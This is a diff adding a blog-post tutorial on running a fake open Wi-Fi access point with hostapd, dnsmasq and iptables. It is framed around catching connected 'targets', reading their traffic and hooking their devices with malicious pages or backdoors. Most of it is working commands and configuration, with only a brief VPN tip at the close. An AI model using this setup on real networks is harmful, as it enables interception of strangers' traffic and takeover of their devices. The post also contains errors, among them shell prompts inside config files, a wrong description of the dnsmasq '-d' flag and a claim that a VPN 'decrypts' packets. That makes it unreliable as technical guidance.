@@ -1,0 +1,191 @@
+---
+title: 'How To Start a Fake Access Point (Fake WIFI)?'
+date: '2021-03-15'
+tags: ['Networking', 'Hacking', 'guide']
+featured: false
+excerpt: 'If you are in a random place and happened to be connected to an open network, it doesnt matter what device you are connected with, your data will be visible to the person who is controlling the access point.'
+image: '/images/blog/05/01.png'
+---
+
+### How dangerous can an access point be?
+
+If you are in a random place and happened to be connected to an open network, it doesn't matter what device you are connected with, your data will be visible to the person who is controlling the access point. Not only that, but the person in control can have a complete control over your device by hooking you with a malicious web page or a backdoor.
+
+## How can you control the devices that are connected to your fake access point?
+
+There are many methods to do that. You can redirect the connected user to a specific malicious website that you also control and hook their devices. Furthermore, you can run and execute backdoors by using python MITM scripts on the connected devices. You also can replace the download files that the connected users requests on the fly without being suspicious, we will be doing that in the next article.
+
+- Lets take a look on how to start a fake AP…
+
+#### STEP 1:
+
+- First we will need to update Kali Linux to the latest version and install the required packages.
+
+```
+$ sudo apt-get update
+$ sudo apt-get install hostapd dnsmasq apache2
+```
+
+#### STEP 2:
+
+We need to put the wireless card in monitor mode to allow us to sniff the packets in and around the network. You can use this method:
+
+```
+$ ifconfig wlan0 down
+$ iwconfig wlan0 mode monitor
+$ ifconfig wlan0 up
+```
+
+- Or if that didn't work, you can use this method instead:
+
+```
+$ airmon-ng start wlan0
+```
+
+_Note_ that the wireless adapter's name has changed from wlan0 to wlan0mon, so we need to use the new given name which is wlan0mon.
+
+#### STEP 3:
+
+To make things organized and easier to work with, we will make a new directory in root and call it "FAP" or fake access point.
+
+```
+$ mkdir /root/fap
+$ cd /root/fap
+```
+
+- · mkdir: command for making a new directory in linux.
+- · cd: command to navigate to a specific directory, in this case its fap.
+
+#### STEP 4:
+
+Once we are in `/root/fap` that we created, we will now setup a new hostapd configuration file and write instructions inside. Hostapd (Host access point daemon) is a software access point that lets the user to use his/her wireless adapter to broadcast several access points at the same time.
+
+```
+$ nano hostapd.conf
+```
+
+- · nano: is a command line text editor included in most Linux installations.
+- · hostapd.conf: is the name of the configuration file that we created.
+
+- Now inside hostapd.conf, we need to setup instruction orders for it.
+
+```
+$ interface=wlan0mon
+$ driver=nl80211
+$ ssid=[Name of the Wifi]
+$ hw_mode=g
+$ channel=[Channel number]
+$ macaddr_acl=0
+$ ignore_broadcast_ssid=0
+```
+
+- After writing these instructions, press CTRL+X, then Y, then ENTER. Now we are all set for hostapd.conf.
+
+- · interface: The name of the wireless adapter that we are using in monitor mode.
+- · driver: The supported driver for hostapd.
+- · ssid: The broadcasted Wifi name.
+- · hw_mode=g : Simply instruct it to use 2.4GHz band.
+- · channel: The channel number to use for the fake access point.
+- · macaddr_acl=0: Tells hostapd to not use MAC filtering. [macaddr_acl=1] tells it to use MAC filtering.
+- · ignore_broadcast_ssid=0 : To make the fake access point visible and not hidden.
+
+#### STEP 5:
+
+Start the fake access point by doing:
+
+```
+$ hostapd hostapd.conf
+```
+
+You will notice that our access point will appear as an open Wifi network. Now open a new terminal window without closing the previous one. In the new terminal window, navigate back to the fap directory by doing:
+
+```
+$ cd /root/fap
+```
+
+#### STEP 6:
+
+We will be using dnsmasq for this step. Dnsmasq is a Dynamic Host Configuration Protocol (DHCP) server that is used to resolve dns requests from or to a machine and also acts as DHCP server to allocate IP addresses to the clients. It is fast and serves a great purpose that fits our needs. We will create a configuration file for dnsmasq and put some instructions in it, just like what we did previously with hostapd. To create the file:
+
+```
+$ nano dnsmasq.conf
+```
+
+Add these instructions inside:
+
+```
+$ interface=wlan0mon
+$ dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h
+$ dhcp-option=3, 192.168.1.1
+$ dhcp-option=6, 192.168.1.1
+$ server=8.8.8.8
+$ log-queries
+$ log-dhcp
+$ listen-address=127.0.0.1
+```
+
+- · dhcp-range: IP address range for the connected network clients. 12h is the amount of hours until the lease expires.
+- · dhcp-option=3: Gateway IP for the networks.
+- · dhcp-option=6: For DNS Server followed by IP address
+- · server: DNS server's address
+- · log-queries: Log the results of DNS queries handled by dnsmasq.
+- · log-dhcp: Log all the options sent to DHCP clients and the tags used to determine them.
+- · listen-address: Links the DHCP to the local IP address which is 127.0.0.1.
+
+Press CTRL+X, then Y, then ENTER. Now we are all set for dnsmasq.conf.
+
+#### STEP 7:
+
+Now we need to assign the interface a network gateway and netmask and then add the routing table.
+
+```
+$ ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0
+$ route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+```
+
+Start the DNS server by doing:
+
+```
+$ dnsmasq -C dnsmasq.conf -d
+```
+
+- · dnsmasq -C: Specifies a different configuration file.
+- · -d : Tells it to keep the user id without changing it.
+
+Open a new terminal window to continue with the next step.
+
+#### STEP 8:
+
+To provide the users with internet access, we need to forward traffic from eth0, the virtual wireless adapter that is connected to the internet, to wlan0mon. This will help you perform various attacks that can give you complete access to the user's device. If you don't want the users to have internet access, skip this step.
+
+```
+$ iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+$ iptables --append FORWARD --in-interface wlan0mon -j ACCEPT
+```
+
+- · First command: Interface name that is used to forward traffic from.
+- · Second command: Interface name to receive the packets or the interface that is being forwarded to.
+
+Now execute this command to enable IP Forwarding:
+
+```
+$ echo 1 > /proc/sys/net/ipv4/ip_forward
+```
+
+#### STEP 9:
+
+Test out your fake access point by playing the victim. Connect to your network and access any website you like, you should be able to see all the packets transmitted on the fly in the terminal.
+
+Hostapd will show the mac address as soon as a device has connected to the network.
+
+On the other terminal window where dnsmasq is running, you will find out what the device is trying to access in details. For this example, the user is accessing Facebook.com
+
+For this example, the user is accessing Facebook.com and so on.
+
+## Closure:
+
+This shows how powerful a fake access point can be. Once you got your targets connected, you will have many attacks available that could eventually control the user's device.
+
+Setting up a fake access point can teach you the security of the network, and how a network typically works. It will also show you what the person in control of the network can do with the connected devices. As we saw previously, you can pretty much have access to all the packets that the user's device is requesting.
+
+If you happen to be connected to a public and unsecure network, A simple way to solve and protect yourself is to use a reputable VPN. A VPN will decrypt the packets making it impossible for the person controlling the network from seeing what the user is accessing.
